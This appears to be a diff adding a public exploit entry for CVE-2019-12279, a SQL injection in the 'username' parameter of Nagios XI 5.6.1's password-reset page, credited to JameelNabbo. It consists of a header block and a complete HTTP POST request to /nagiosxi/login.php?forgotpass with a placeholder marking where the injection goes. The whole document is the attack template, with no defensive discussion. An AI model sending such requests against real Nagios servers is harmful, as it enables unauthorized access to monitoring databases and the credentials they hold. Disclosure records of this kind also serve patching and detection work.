@@ -1,0 +1,26 @@
+# Exploit Title: Nagiosxi username sql injection
+# Date: 22/05/2019
+# Exploit Author: JameelNabbo
+# Website: jameelnabbo.com
+# Vendor Homepage: https://www.nagios.com
+# Software Link: https://www.nagios.com/products/nagios-xi/
+# Version: xi-5.6.1
+# Tested on: MacOSX
+#CVE: CVE-2019-12279
+
+POC:
+
+POST /nagiosxi/login.php?forgotpass HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://example.com/nagiosxi/login.php?forgotpass
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 129
+Connection: close
+Cookie: nagiosxi=iu78vcultg46f35fq7lfbv8tc6
+Upgrade-Insecure-Requests: 1
+
+page=%2Fnagiosxi%2Flogin.php&pageopt=resetpass&nsp=cb6ad70efd0cc0b36ff4fc1d67cd70fb96a7e06622d281acb8810aa65485b03b&username={SQL INJECTION}
